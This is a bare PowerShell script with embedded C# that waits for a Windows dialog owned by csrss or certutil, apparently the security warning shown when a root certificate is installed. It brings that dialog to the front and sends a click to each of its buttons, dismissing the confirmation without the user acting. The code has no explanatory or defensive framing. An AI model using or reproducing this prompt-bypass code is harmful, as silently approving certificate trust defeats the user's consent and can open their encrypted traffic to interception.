function ConfirmCert{
Add-Type @"
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;

public static class Win32
{
  [DllImport("user32.dll", CharSet = CharSet.Unicode)]
  public static extern IntPtr FindWindow(String sClassName, String sAppName);
  
  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
  static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
  
  [DllImport("user32.dll")]
  [return: MarshalAs(UnmanagedType.Bool)]
  static extern bool SetForegroundWindow(IntPtr hWnd);
  
  public delegate bool EnumWindowProc(IntPtr hwnd, IntPtr lParam);
  
  [DllImport("user32")]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool EnumChildWindows(IntPtr window, EnumWindowProc callback, IntPtr lParam);  
  
  [DllImport("user32.dll", CharSet = CharSet.Auto)]
  static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
  const int BM_CLICK = 0x00F5;    
  public static void Start(){
  	IntPtr hWnd;
  	do{
  		hWnd = FindWindow("#32770", null);
  		if (!hWnd.Equals(IntPtr.Zero))
        {
        	String sExeName=GetExeName(hWnd);
  			if(GetExeName(hWnd).Contains("csrss") || GetExeName(hWnd).Contains("certutil"))
	        {
		        break;
	        }else
	        {
		        hWnd=IntPtr.Zero;
	        }
  		}
  	}while (hWnd.Equals(IntPtr.Zero));
    SetForegroundWindow(hWnd);
  	EnumWindowProc childProc = new EnumWindowProc(EnumWindow);
    EnumChildWindows(hWnd, childProc, IntPtr.Zero);
  }
  public static String GetExeName(IntPtr hWnd){
  	uint processID = 0;
    uint threadID = GetWindowThreadProcessId(hWnd, out processID);
    Process p = Process.GetProcessById((int)processID);
    return p.ProcessName.ToLower();
  }
  public static bool EnumWindow(IntPtr hWnd, IntPtr lParam)
  {
  	SendMessage(hWnd, BM_CLICK, IntPtr.Zero, IntPtr.Zero);
  	return true;
  }
}
"@;
[Win32]::Start();
}
ConfirmCert
